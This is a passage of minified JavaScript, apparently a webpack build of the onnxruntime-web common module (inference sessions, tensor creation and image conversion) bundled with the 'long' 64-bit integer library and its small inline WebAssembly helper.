v=arg1[name];(null===v||v instanceof tensor_js_1.Tensor)&&(isFetches=!0,isFetchesEmpty=!1,fetches[name]=v)}if(isFetches){if("object"==typeof arg2&&null!==arg2)options=arg2;else if(void 0!==arg2)throw new TypeError("'options' must be an object.")}else options=arg1}}else if(void 0!==arg1)throw new TypeError("Unexpected argument[1]: must be 'fetches' or 'options'.");for(const name of this.inputNames)if(void 0===feeds[name])throw new Error(`input '${name}' is missing in 'feeds'.`);if(isFetchesEmpty)for(const name of this.outputNames)fetches[name]=null;const results=await this.handler.run(feeds,fetches,options),returnValue={};for(const key in results)Object.hasOwnProperty.call(results,key)&&(returnValue[key]=new tensor_js_1.Tensor(results[key].type,results[key].data,results[key].dims));return returnValue}async release(){return this.handler.dispose()}static async create(arg0,arg1,arg2,arg3){let filePathOrUint8Array,options={};if("string"==typeof arg0){if(filePathOrUint8Array=arg0,"object"==typeof arg1&&null!==arg1)options=arg1;else if(void 0!==arg1)throw new TypeError("'options' must be an object.")}else if(arg0 instanceof Uint8Array){if(filePathOrUint8Array=arg0,"object"==typeof arg1&&null!==arg1)options=arg1;else if(void 0!==arg1)throw new TypeError("'options' must be an object.")}else{if(!(arg0 instanceof ArrayBuffer||"undefined"!=typeof SharedArrayBuffer&&arg0 instanceof SharedArrayBuffer))throw new TypeError("Unexpected argument[0]: must be 'path' or 'buffer'.");{const buffer=arg0;let byteOffset=0,byteLength=arg0.byteLength;if("object"==typeof arg1&&null!==arg1)options=arg1;else if("number"==typeof arg1){if(byteOffset=arg1,!Number.isSafeInteger(byteOffset))throw new RangeError("'byteOffset' must be an integer.");if(byteOffset<0||byteOffset>=buffer.byteLength)throw new RangeError(`'byteOffset' is out of range [0, ${buffer.byteLength}).`);if(byteLength=arg0.byteLength-byteOffset,"number"==typeof arg2){if(byteLength=arg2,!Number.isSafeInteger(byteLength))throw new RangeError("'byteLength' must be an integer.");if(byteLength<=0||byteOffset+byteLength>buffer.byteLength)throw new RangeError(`'byteLength' is out of range (0, ${buffer.byteLength-byteOffset}].`);if("object"==typeof arg3&&null!==arg3)options=arg3;else if(void 0!==arg3)throw new TypeError("'options' must be an object.")}else if(void 0!==arg2)throw new TypeError("'byteLength' must be a number.")}else if(void 0!==arg1)throw new TypeError("'options' must be an object.");filePathOrUint8Array=new Uint8Array(buffer,byteOffset,byteLength)}}const backendHints=(options.executionProviders||[]).map((i=>"string"==typeof i?i:i.name)),backend=await(0,backend_impl_js_1.resolveBackend)(backendHints),handler=await backend.createSessionHandler(filePathOrUint8Array,options);return new InferenceSession(handler)}startProfiling(){this.handler.startProfiling()}endProfiling(){this.handler.endProfiling()}get inputNames(){return this.handler.inputNames}get outputNames(){return this.handler.outputNames}}exports.InferenceSession=InferenceSession},"../common/dist/cjs/inference-session.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.InferenceSession=void 0;const inference_session_impl_js_1=__webpack_require__("../common/dist/cjs/inference-session-impl.js");exports.InferenceSession=inference_session_impl_js_1.InferenceSession},"../common/dist/cjs/onnx-value.js":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0})},"../common/dist/cjs/tensor-conversion-impl.js":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.tensorToImageData=exports.tensorToDataURL=void 0;exports.tensorToDataURL=(tensor,options)=>{const canvas=document.createElement("canvas");canvas.width=tensor.dims[3],canvas.height=tensor.dims[2];const pixels2DContext=canvas.getContext("2d");if(null!=pixels2DContext){let width,height;void 0!==options?.tensorLayout&&"NHWC"===options.tensorLayout?(width=tensor.dims[2],height=tensor.dims[3]):(width=tensor.dims[3],height=tensor.dims[2]);const inputformat=void 0!==options?.format?options.format:"RGB",norm=options?.norm;let normMean,normBias;void 0===norm||void 0===norm.mean?normMean=[255,255,255,255]:"number"==typeof norm.mean?normMean=[norm.mean,norm.mean,norm.mean,norm.mean]:(normMean=[norm.mean[0],norm.mean[1],norm.mean[2],0],void 0!==norm.mean[3]&&(normMean[3]=norm.mean[3])),void 0===norm||void 0===norm.bias?normBias=[0,0,0,0]:"number"==typeof norm.bias?normBias=[norm.bias,norm.bias,norm.bias,norm.bias]:(normBias=[norm.bias[0],norm.bias[1],norm.bias[2],0],void 0!==norm.bias[3]&&(normBias[3]=norm.bias[3]));const stride=height*width;let rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride,aTensorPointer=-1;"RGBA"===inputformat?(rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride,aTensorPointer=3*stride):"RGB"===inputformat?(rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride):"RBG"===inputformat&&(rTensorPointer=0,bTensorPointer=stride,gTensorPointer=2*stride);for(let i=0;i<height;i++)for(let j=0;j<width;j++){const R=(tensor.data[rTensorPointer++]-normBias[0])*normMean[0],G=(tensor.data[gTensorPointer++]-normBias[1])*normMean[1],B=(tensor.data[bTensorPointer++]-normBias[2])*normMean[2],A=-1===aTensorPointer?255:(tensor.data[aTensorPointer++]-normBias[3])*normMean[3];pixels2DContext.fillStyle="rgba("+R+","+G+","+B+","+A+")",pixels2DContext.fillRect(j,i,1,1)}return canvas.toDataURL()}throw new Error("Can not access image data")};exports.tensorToImageData=(tensor,options)=>{const pixels2DContext=document.createElement("canvas").getContext("2d");let image;if(null==pixels2DContext)throw new Error("Can not access image data");{let width,height,channels;void 0!==options?.tensorLayout&&"NHWC"===options.tensorLayout?(width=tensor.dims[2],height=tensor.dims[1],channels=tensor.dims[3]):(width=tensor.dims[3],height=tensor.dims[2],channels=tensor.dims[1]);const inputformat=void 0!==options&&void 0!==options.format?options.format:"RGB",norm=options?.norm;let normMean,normBias;void 0===norm||void 0===norm.mean?normMean=[255,255,255,255]:"number"==typeof norm.mean?normMean=[norm.mean,norm.mean,norm.mean,norm.mean]:(normMean=[norm.mean[0],norm.mean[1],norm.mean[2],255],void 0!==norm.mean[3]&&(normMean[3]=norm.mean[3])),void 0===norm||void 0===norm.bias?normBias=[0,0,0,0]:"number"==typeof norm.bias?normBias=[norm.bias,norm.bias,norm.bias,norm.bias]:(normBias=[norm.bias[0],norm.bias[1],norm.bias[2],0],void 0!==norm.bias[3]&&(normBias[3]=norm.bias[3]));const stride=height*width;if(void 0!==options&&(void 0!==options.format&&4===channels&&"RGBA"!==options.format||3===channels&&"RGB"!==options.format&&"BGR"!==options.format))throw new Error("Tensor format doesn't match input tensor dims");const step=4;let rImagePointer=0,gImagePointer=1,bImagePointer=2,aImagePointer=3,rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride,aTensorPointer=-1;"RGBA"===inputformat?(rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride,aTensorPointer=3*stride):"RGB"===inputformat?(rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride):"RBG"===inputformat&&(rTensorPointer=0,bTensorPointer=stride,gTensorPointer=2*stride),image=pixels2DContext.createImageData(width,height);for(let i=0;i<height*width;rImagePointer+=step,gImagePointer+=step,bImagePointer+=step,aImagePointer+=step,i++)image.data[rImagePointer]=(tensor.data[rTensorPointer++]-normBias[0])*normMean[0],image.data[gImagePointer]=(tensor.data[gTensorPointer++]-normBias[1])*normMean[1],image.data[bImagePointer]=(tensor.data[bTensorPointer++]-normBias[2])*normMean[2],image.data[aImagePointer]=-1===aTensorPointer?255:(tensor.data[aTensorPointer++]-normBias[3])*normMean[3]}return image}},"../common/dist/cjs/tensor-factory-impl.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.tensorFromImage=exports.bufferToTensor=void 0;const tensor_js_1=__webpack_require__("../common/dist/cjs/tensor.js");exports.bufferToTensor=(buffer,options)=>{if(void 0===buffer)throw new Error("Image buffer must be defined");if(void 0===options.height||void 0===options.width)throw new Error("Image height and width must be defined");if("NHWC"===options.tensorLayout)throw new Error("NHWC Tensor layout is not supported yet");const{height:height,width:width}=options,norm=options.norm??{mean:255,bias:0};let normMean,normBias;normMean="number"==typeof norm.mean?[norm.mean,norm.mean,norm.mean,norm.mean]:[norm.mean[0],norm.mean[1],norm.mean[2],norm.mean[3]??255],normBias="number"==typeof norm.bias?[norm.bias,norm.bias,norm.bias,norm.bias]:[norm.bias[0],norm.bias[1],norm.bias[2],norm.bias[3]??0];const inputformat=void 0!==options.format?options.format:"RGBA",outputformat=void 0!==options.tensorFormat&&void 0!==options.tensorFormat?options.tensorFormat:"RGB",stride=height*width,float32Data="RGBA"===outputformat?new Float32Array(4*stride):new Float32Array(3*stride);let step=4,rImagePointer=0,gImagePointer=1,bImagePointer=2,aImagePointer=3,rTensorPointer=0,gTensorPointer=stride,bTensorPointer=2*stride,aTensorPointer=-1;"RGB"===inputformat&&(step=3,rImagePointer=0,gImagePointer=1,bImagePointer=2,aImagePointer=-1),"RGBA"===outputformat?aTensorPointer=3*stride:"RBG"===outputformat?(rTensorPointer=0,bTensorPointer=stride,gTensorPointer=2*stride):"BGR"===outputformat&&(bTensorPointer=0,gTensorPointer=stride,rTensorPointer=2*stride);for(let i=0;i<stride;i++,rImagePointer+=step,bImagePointer+=step,gImagePointer+=step,aImagePointer+=step)float32Data[rTensorPointer++]=(buffer[rImagePointer]+normBias[0])/normMean[0],float32Data[gTensorPointer++]=(buffer[gImagePointer]+normBias[1])/normMean[1],float32Data[bTensorPointer++]=(buffer[bImagePointer]+normBias[2])/normMean[2],-1!==aTensorPointer&&-1!==aImagePointer&&(float32Data[aTensorPointer++]=(buffer[aImagePointer]+normBias[3])/normMean[3]);return"RGBA"===outputformat?new tensor_js_1.Tensor("float32",float32Data,[1,4,height,width]):new tensor_js_1.Tensor("float32",float32Data,[1,3,height,width])};exports.tensorFromImage=async(image,options)=>{const isHTMLImageEle="undefined"!=typeof HTMLImageElement&&image instanceof HTMLImageElement,isImageDataEle="undefined"!=typeof ImageData&&image instanceof ImageData,isImageBitmap="undefined"!=typeof ImageBitmap&&image instanceof ImageBitmap,isString="string"==typeof image;let data,bufferToTensorOptions=options??{};if(isHTMLImageEle){const canvas=document.createElement("canvas");canvas.width=image.width,canvas.height=image.height;const pixels2DContext=canvas.getContext("2d");if(null==pixels2DContext)throw new Error("Can not access image data");{let height=image.height,width=image.width;if(void 0!==options&&void 0!==options.resizedHeight&&void 0!==options.resizedWidth&&(height=options.resizedHeight,width=options.resizedWidth),void 0!==options){if(bufferToTensorOptions=options,void 0!==options.tensorFormat)throw new Error("Image input config format must be RGBA for HTMLImageElement");bufferToTensorOptions.tensorFormat="RGBA",bufferToTensorOptions.height=height,bufferToTensorOptions.width=width}else bufferToTensorOptions.tensorFormat="RGBA",bufferToTensorOptions.height=height,bufferToTensorOptions.width=width;pixels2DContext.drawImage(image,0,0),data=pixels2DContext.getImageData(0,0,width,height).data}}else{if(!isImageDataEle){if(isImageBitmap){if(void 0===options)throw new Error("Please provide image config with format for Imagebitmap");const canvas=document.createElement("canvas");canvas.width=image.width,canvas.height=image.height;const pixels2DContext=canvas.getContext("2d");if(null!=pixels2DContext){const height=image.height,width=image.width;return pixels2DContext.drawImage(image,0,0,width,height),data=pixels2DContext.getImageData(0,0,width,height).data,bufferToTensorOptions.height=height,bufferToTensorOptions.width=width,(0,exports.bufferToTensor)(data,bufferToTensorOptions)}throw new Error("Can not access image data")}if(isString)return new Promise(((resolve,reject)=>{const canvas=document.createElement("canvas"),context=canvas.getContext("2d");if(!image||!context)return reject();const newImage=new Image;newImage.crossOrigin="Anonymous",newImage.src=image,newImage.onload=()=>{canvas.width=newImage.width,canvas.height=newImage.height,context.drawImage(newImage,0,0,canvas.width,canvas.height);const img=context.getImageData(0,0,canvas.width,canvas.height);bufferToTensorOptions.height=canvas.height,bufferToTensorOptions.width=canvas.width,resolve((0,exports.bufferToTensor)(img.data,bufferToTensorOptions))}}));throw new Error("Input data provided is not supported - aborted tensor creation")}{let height,width;if(void 0!==options&&void 0!==options.resizedWidth&&void 0!==options.resizedHeight?(height=options.resizedHeight,width=options.resizedWidth):(height=image.height,width=image.width),void 0!==options&&(bufferToTensorOptions=options),bufferToTensorOptions.format="RGBA",bufferToTensorOptions.height=height,bufferToTensorOptions.width=width,void 0!==options){const tempCanvas=document.createElement("canvas");tempCanvas.width=width,tempCanvas.height=height;const pixels2DContext=tempCanvas.getContext("2d");if(null==pixels2DContext)throw new Error("Can not access image data");pixels2DContext.putImageData(image,0,0),data=pixels2DContext.getImageData(0,0,width,height).data}else data=image.data}}if(void 0!==data)return(0,exports.bufferToTensor)(data,bufferToTensorOptions);throw new Error("Input data provided is not supported - aborted tensor creation")}},"../common/dist/cjs/tensor-impl.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Tensor=void 0;const tensor_conversion_impl_js_1=__webpack_require__("../common/dist/cjs/tensor-conversion-impl.js"),tensor_factory_impl_js_1=__webpack_require__("../common/dist/cjs/tensor-factory-impl.js"),tensor_utils_impl_js_1=__webpack_require__("../common/dist/cjs/tensor-utils-impl.js"),NUMERIC_TENSOR_TYPE_TO_TYPEDARRAY_MAP=new Map([["float32",Float32Array],["uint8",Uint8Array],["int8",Int8Array],["uint16",Uint16Array],["float16",Uint16Array],["int16",Int16Array],["int32",Int32Array],["bool",Uint8Array],["float64",Float64Array],["uint32",Uint32Array]]),NUMERIC_TENSOR_TYPEDARRAY_TO_TYPE_MAP=new Map([[Float32Array,"float32"],[Uint8Array,"uint8"],[Int8Array,"int8"],[Uint16Array,"uint16"],[Int16Array,"int16"],[Int32Array,"int32"],[Float64Array,"float64"],[Uint32Array,"uint32"]]);let isBigIntChecked=!1;exports.Tensor=class Tensor{constructor(arg0,arg1,arg2){let type,data,dims;if((()=>{if(!isBigIntChecked){isBigIntChecked=!0;const isBigInt64ArrayAvailable="undefined"!=typeof BigInt64Array&&"function"==typeof BigInt64Array.from,isBigUint64ArrayAvailable="undefined"!=typeof BigUint64Array&&"function"==typeof BigUint64Array.from;isBigInt64ArrayAvailable&&(NUMERIC_TENSOR_TYPE_TO_TYPEDARRAY_MAP.set("int64",BigInt64Array),NUMERIC_TENSOR_TYPEDARRAY_TO_TYPE_MAP.set(BigInt64Array,"int64")),isBigUint64ArrayAvailable&&(NUMERIC_TENSOR_TYPE_TO_TYPEDARRAY_MAP.set("uint64",BigUint64Array),NUMERIC_TENSOR_TYPEDARRAY_TO_TYPE_MAP.set(BigUint64Array,"uint64"))}})(),"string"==typeof arg0)if(type=arg0,dims=arg2,"string"===arg0){if(!Array.isArray(arg1))throw new TypeError("A string tensor's data must be a string array.");data=arg1}else{const typedArrayConstructor=NUMERIC_TENSOR_TYPE_TO_TYPEDARRAY_MAP.get(arg0);if(void 0===typedArrayConstructor)throw new TypeError(`Unsupported tensor type: ${arg0}.`);if(Array.isArray(arg1)){if("float16"===arg0)throw new TypeError("Creating a float16 tensor from number array is not supported. Please use Uint16Array as data.");data="uint64"===arg0||"int64"===arg0?typedArrayConstructor.from(arg1,BigInt):typedArrayConstructor.from(arg1)}else{if(!(arg1 instanceof typedArrayConstructor))throw new TypeError(`A ${type} tensor's data must be type of ${typedArrayConstructor}`);data=arg1}}else if(dims=arg1,Array.isArray(arg0)){if(0===arg0.length)throw new TypeError("Tensor type cannot be inferred from an empty array.");const firstElementType=typeof arg0[0];if("string"===firstElementType)type="string",data=arg0;else{if("boolean"!==firstElementType)throw new TypeError(`Invalid element type of data array: ${firstElementType}.`);type="bool",data=Uint8Array.from(arg0)}}else{const mappedType=NUMERIC_TENSOR_TYPEDARRAY_TO_TYPE_MAP.get(arg0.constructor);if(void 0===mappedType)throw new TypeError(`Unsupported type for tensor data: ${arg0.constructor}.`);type=mappedType,data=arg0}if(void 0===dims)dims=[data.length];else if(!Array.isArray(dims))throw new TypeError("A tensor's dims must be a number array");const size=(0,tensor_utils_impl_js_1.calculateSize)(dims);if(size!==data.length)throw new Error(`Tensor's size(${size}) does not match data length(${data.length}).`);this.dims=dims,this.type=type,this.data=data,this.size=size}static async fromImage(image,options){return(0,tensor_factory_impl_js_1.tensorFromImage)(image,options)}toDataURL(options){return(0,tensor_conversion_impl_js_1.tensorToDataURL)(this,options)}toImageData(options){return(0,tensor_conversion_impl_js_1.tensorToImageData)(this,options)}reshape(dims){return(0,tensor_utils_impl_js_1.tensorReshape)(this,dims)}}},"../common/dist/cjs/tensor-utils-impl.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.tensorReshape=exports.calculateSize=void 0;const tensor_js_1=__webpack_require__("../common/dist/cjs/tensor.js");exports.calculateSize=dims=>{let size=1;for(let i=0;i<dims.length;i++){const dim=dims[i];if("number"!=typeof dim||!Number.isSafeInteger(dim))throw new TypeError(`dims[${i}] must be an integer, got: ${dim}`);if(dim<0)throw new RangeError(`dims[${i}] must be a non-negative integer, got: ${dim}`);size*=dim}return size};exports.tensorReshape=(tensor,dims)=>new tensor_js_1.Tensor(tensor.type,tensor.data,dims)},"../common/dist/cjs/tensor.js":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Tensor=void 0;const tensor_impl_js_1=__webpack_require__("../common/dist/cjs/tensor-impl.js");exports.Tensor=tensor_impl_js_1.Tensor},"../common/dist/cjs/version.js":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.version=void 0,exports.version="1.16.3"},"./node_modules/long/umd/index.js":(module,exports)=>{var __WEBPACK_AMD_DEFINE_RESULT__,Long=function(exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var wasm=null;try{wasm=new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,13,2,96,0,1,127,96,4,127,127,127,127,1,127,3,7,6,0,1,1,1,1,1,6,6,1,127,1,65,0,11,7,50,6,3,109,117,108,0,1,5,100,105,118,95,115,0,2,5,100,105,118,95,117,0,3,5,114,101,109,95,115,0,4,5,114,101,109,95,117,0,5,8,103,101,116,95,104,105,103,104,0,0,10,191,1,6,4,0,35,0,11,36,1,1,126,32,0,173,32,1,173,66,32,134,132,32,2,173,32,3,173,66,32,134,132,126,34,4,66,32,135,167,36,0,32,4,167,11,36,1,1,126,32,0,173,32,1,173,66,32,134,132,32,2,173,32,3,173,66,32,134,132,127,34,4,66,32,135,167,36,0,32,4,167,11,36,1,1,126,32,0,173,32,1,173,66,32,134,132,32,2,173,32,3,173,66,32,134,132,128,34,4,66,32,135,167,36,0,32,4,167,11,36,1,1,126,32,0,173,32,1,173,66,32,134,132,32,2,173,32,3,173,66,32,134,132,129,34,4,66,32,135,167,36,0,32,4,167,11,36,1,1,126,32,0,173,32,1,173,66,32,134,132,32,2,173,32,3,173,66,32,134,132,130,34,4,66,32,135,167,36,0,32,4,167,11])),{}).exports}catch(e){}function Long(low,high,unsigned){this.low=0|low,this.high=0|high,this.unsigned=!!unsigned}function isLong(obj){return!0===(obj&&obj.__isLong__)}function ctz32(value){var c=Math.clz32(value&-value);return value?31-c:c}Long.prototype.__isLong__,Object.defineProperty(Long.prototype,"__isLong__",{value:!0}),Long.isLong=isLong;var INT_CACHE={},UINT_CACHE={};function fromInt(value,unsigned){var obj,cachedObj,cache;return unsigned?(cache=0<=(value>>>=0)&&value<256)&&(cachedObj=UINT_CACHE[value])?cachedObj:(obj=fromBits(value,0,!0),cache&&(UINT_CACHE[value]=obj),obj):(cache=-128<=(value|=0)&&value<128)&&(cachedObj=INT_CACHE[value])?cachedObj:(obj=fromBits(value,value<0?-1:0,!1),cache&&(INT_CACHE[value]=obj),obj)}function fromNumber(value,unsigned){if(isNaN(value))return unsigned?UZERO:ZERO;if(unsigned){if(value<0)return UZERO;if(value>=TWO_PWR_64_DBL)return MAX_UNSIGNED_VALUE}else{if(value<=-TWO_PWR_63_DBL)return MIN_VALUE;if(value+1>=TWO_PWR_63_DBL)return MAX_VALUE}return value<0?fromNumber(-value,unsigned).neg():fromBits(value%TWO_PWR_32_DBL|0,value/TWO_PWR_32_DBL|0,unsigned)}function fromBits(lowBits,highBits,unsigned){return new Long(lowBits,highBits,unsigned)}Long.fromInt=fromInt,Long.fromNumber=fromNumber,Long.fromBits=fromBits;var pow_dbl=Math.pow;function fromString(str,unsigned,radix){if(0===str.length)throw Error("empty string");if("number"==typeof unsigned?(radix=unsigned,unsigned=!1):unsigned=!!unsigned,"NaN"===str||"Infinity"===str||"+Infinity"===str||"-Infinity"===str)return unsigned?UZERO:ZERO;if((radix=radix||10)<2||36<radix)throw RangeError("radix");var p;if((p=str.indexOf("-"))>0)throw Error("interior hyphen");if(0===p)return fromString(str.substring(1),unsigned,radix).neg();for(var radixToPower=fromNumber(pow_dbl(radix,8)),result=ZERO,i=0;i<str.length;i+=8){var size=Math.min(8,str.length-i),value=parseInt(str.substring(i,i+size),radix);if(size<8){var power=fromNumber(pow_dbl(radix,size));result=result.mul(power).add(fromNumber(value))}else result=(result=result.mul(radixToPower)).add(fromNumber(value))}return result.unsigned=unsigned,result}function fromValue(val,unsigned){return"number"==typeof val?fromNumber(val,unsigned):"string"==typeof val?fromString(val,unsigned):fromBits(val.low,val.high,"boolean"==typeof unsigned?unsigned:val.unsigned)}Long.fromString=fromString,Long.fromValue=fromValue;var TWO_PWR_32_DBL=4294967296,TWO_PWR_64_DBL=TWO_PWR_32_DBL*TWO_PWR_32_DBL,TWO_PWR_63_DBL=TWO_PWR_64_DBL/2,TWO_PWR_24=fromInt(1<<24),ZERO=fromInt(0);Long.ZERO=ZERO;var UZERO=fromInt(0,!0);Long.UZERO=UZERO;var ONE=fromInt(1);Long.ONE=ONE;var UONE=fromInt(1,!0);Long.UONE=UONE;var NEG_ONE=fromInt(-1);Long.NEG_ONE=NEG_ONE;var MAX_VALUE=fromBits(-1,2147483647,!1);Long.MAX_VALUE=MAX_VALUE;var MAX_UNSIGNED_VALUE=fromBits(-1,-1,!0);Long.MAX_UNSIGNED_VALUE=MAX_UNSIGNED_VALUE;var MIN_VALUE=fromBits(0,-2147483648,!1);Long.MIN_VALUE=MIN_VALUE;var LongPrototype=Long.prototype;LongPrototype.toInt=function toInt(){return this.unsigned?this.low>>>0:this.low},LongPrototype.toNumber=function toNumber(){return this.unsigned?(this.high>>>0)*TWO_PWR_32_DBL+(this.low>>>0):this.high*TWO_PWR_32_DBL+(this.low>>>0)},LongPrototype.toString=function toString(radix){if((radix=radix||10)<2||36<radix)throw RangeError("radix");if(this.isZero())return"0";if(this.isNegative()){if(this.eq(MIN_VALUE)){var radixLong=fromNumber(radix),div=this.div(radixLong),rem1=div.mul(radixLong).sub(this);return div.toString(radix)+rem1.toInt().toString(radix)}return"-"+this.neg().toString(radix)}for(var radixToPower=fromNumber(pow_dbl(radix,6),this.unsigned),rem=this,result="";;){var remDiv=rem.div(radixToPower),digits=(rem.sub(remDiv.mul(radixToPower)).toInt()>>>0).toString(radix);if((rem=remDiv).isZero())return digits+result;for(;digits.length<6;)digits="0"+digits;result=""+digits+result}},LongPrototype.getHighBits=function getHighBits(){return this.high},LongPrototype.getHighBitsUnsigned=function getHighBitsUnsigned(){return this.high>>>0},LongPrototype.getLowBits=function getLowBits(){return this.low},LongPrototype.getLowBitsUnsigned=function getLowBitsUnsigned(){return this.low>>>0},LongPrototype.getNumBitsAbs=function getNumBitsAbs(){if(this.isNegative())return this.eq(MIN_VALUE)?64:this.neg().getNumBitsAbs();for(var val=0!=this.high?this.high:this.low,bit=31;bit>0&&0==(val&1<<bit);bit--);return 0!=this.high?bit+33:bit+1},LongPrototype.isZero=function isZero(){return 0===this.high&&0===this.low},LongPrototype.eqz=LongPrototype.isZero,LongPrototype.isNegative=function isNegative(){return!this.unsigned&&this.high<0},LongPrototype.isPositive=function isPositive(){return this.unsigned||this.high>=0},LongPrototype.isOdd=function isOdd(){return 1==(1&this.low)},LongPrototype.isEven=function isEven(){return 0==(1&this.low)},LongPrototype.equals=function equals(other){return isLong(other)||(other=fromValue(other)),(this.unsigned===other.unsigned||this.high>>>31!=1||other.high>>>31!=1)&&(this.high===other.high&&this.low===other.low)},LongPrototype.eq=LongPrototype.equals,LongPrototype.notEquals=function notEquals(other){return!this.eq(other)},LongPrototype.neq=LongPrototype.notEquals,LongPrototype.ne=LongPrototype.notEquals,LongPrototype.lessThan=function lessThan(other){return this.comp(other)<0},LongPrototype.lt=LongPrototype.lessThan,LongPrototype.lessThanOrEqual=function lessThanOrEqual(other){return this.comp(other)<=0},LongPrototype.lte=LongPrototype.lessThanOrEqual,LongPrototype.le=LongPrototype.lessThanOrEqual,LongPrototype.greaterThan=function greaterThan(other){return this.comp(other)>0},LongPrototype.gt=LongPrototype.greaterThan,LongPrototype.greaterThanOrEqual=function greaterThanOrEqual(other){return this.comp(other)>=0},LongPrototype.gte=LongPrototype.greaterThanOrEqual,LongPrototype.ge=LongPrototype.greaterThanOrEqual,LongPrototype.compare=function compare(other){if(isLong(other)||(other=fromValue(other)),this.eq(other))return 0;var thisNeg=this.isNegative(),otherNeg=other.isNegative();return thisNeg&&!otherNeg?-1:!thisNeg&&otherNeg?1:this.unsigned?other.high>>>0>this.high>>>0||other.high===this.high&&other.low>>>0>this.low>>>0?-1:1:this.sub(other).isNegative()?-1:1},LongPrototype.comp=LongPrototype.compare,LongPrototype.negate=function negate(){return!this.unsigned&&this.eq(MIN_VALUE)?MIN_VALUE:this.not().add(ONE)},LongPrototype.neg=LongPrototype.negate,LongPrototype.add=function add(addend){isLong(addend)||(addend=fromValue(addend));var a48=this.high>>>16,a32=65535&this.high,a16=this.low>>>16,a00=65535&this.low,b48=addend.high>>>16,b32=65535&addend.high,b16=addend.low>>>16,c48=0,c32=0,c16=0,c00=0;return c16+=(c00+=a00+(65535&addend.low))>>>16,c32+=(c16+=a16+b16)>>>16,c48+=(c32+=a32+b32)>>>16,c48+=a48+b48,fromBits((c16&=65535)<<16|(c00&=65535),(c48&=65535)<<16|(c32&=65535),this.unsigned)},LongPrototype.subtract=function subtract(subtrahend){return isLong(subtrahend)||(subtrahend=fromValue(subtrahend)),this.add(subtrahend.neg())},LongPrototype.sub=LongPrototype.subtract,LongPrototype.multiply=function multiply(multiplier){if(this.isZero())return this;if(isLong(multiplier)||(multiplier=fromValue(multiplier)),wasm)return fromBits(wasm.mul(this.low,this.high,multiplier.low,multiplier.high),wasm.get_high(),this.unsigned);if(multiplier.isZero())return this.unsigned?UZERO:ZERO;if(this.eq(MIN_VALUE))return multiplier.isOdd()?MIN_VALUE:ZERO;if(multiplier.eq(MIN_VALUE))return this.isOdd()?MIN_VALUE:ZERO;if(this.isNegative())return multiplier.isNegative()?this.neg().mul(multiplier.neg()):this.neg().mul(multiplier).neg();if(multiplier.isNegative())return this.mul(multiplier.neg()).neg();if(this.lt(TWO_PWR_24)&&multiplier.lt(TWO_PWR_24))return fromNumber(this.toNumber()*multiplier.toNumber(),this.unsigned);var a48=this.high>>>16,a32=65535&this.high,a16=this.low>>>16,a00=65535&this.low,b48=multiplier.high>>>16,b32=65535&multiplier.high,b16=multiplier.low>>>16,b00=65535&multiplier.low,c48=0,c32=0,c16=0,c00=0;return c16+=(c00+=a00*b00)>>>16,c32+=(c16+=a16*b00)>>>16,c16&=65535,c32+=(c16+=a00*b16)>>>16,c48+=(c32+=a32*b00)>>>16,c32&=65535,c48+=(c32+=a16*b16)>>>16,c32&=65535,c48+=(c32+=a00*b32)>>>16,c48+=a48*b00+a32*b16+a16*b32+a00*b48,fromBits((c16&=65535)<<16|(c00&=65535),(c48&=65535)<<16|(c32&=65535),this.unsigned)},LongPrototype.mul=LongPrototype.multiply,LongPrototype.divide=function divide(divisor){if(isLong(divisor)||(divisor=fromValue(divisor)),divisor.isZero())throw Error("division by zero");var approx,rem,res;if(wasm)return this.unsigned||-2147483648!==this.high||-1!==divisor.low||-1!==divisor.high?fromBits((this.unsigned?wasm.div_u:wasm.div_s)(this.low,this.high,divisor.low,divisor.high),wasm.get_high(),this.unsigned):this;if(this.isZero())return this.unsigned?UZERO:ZERO;if(this.unsigned){if(divisor.unsigned||(divisor=divisor.toUnsigned()),divisor.gt(this))return UZERO;if(divisor.gt(this.shru(1)))return UONE;res=UZERO}else{if(this.eq(MIN_VALUE))return divisor.eq(ONE)||divisor.eq(NEG_ONE)?MIN_VALUE:divisor.eq(MIN_VALUE)?ONE:(approx=this.shr(1).div(divisor).shl(1)).eq(ZERO)?divisor.isNegative()?ONE:NEG_ONE:(rem=this.sub(divisor.mul(approx)),res=approx.add(rem.div(divisor)));if(divisor.eq(MIN_VALUE))return this.unsigned?UZERO:ZERO;if(this.isNegative())return divisor.isNegative()?this.neg().div(divisor.neg()):this.neg().div(divisor).neg();if(divisor.isNegative())return this.div(divisor.neg()).neg();res=ZERO}for(rem=this;rem.gte(divisor);){approx=Math.max(1,Math.floor(rem.toNumber()/divisor.toNumber()));for(var log2=Math.ceil(Math.log(approx)/Math.LN2),delta=log2<=48?1:pow_dbl(2,log2-48),approxRes=fromNumber(approx),approxRem=approxRes.mul(divisor);approxRem.isNegative()||approxRem.gt(rem);)approxRem=(approxRes=fromNumber(approx-=delta,this.unsigned)).mul(divisor);approxRes.isZero()&&(approxRes=ONE),res=res.add(approxRes),rem=rem.sub(approxRem)}return res},LongPrototype.div=LongPrototype.divide,LongPrototype.modulo=function modulo(divisor){return 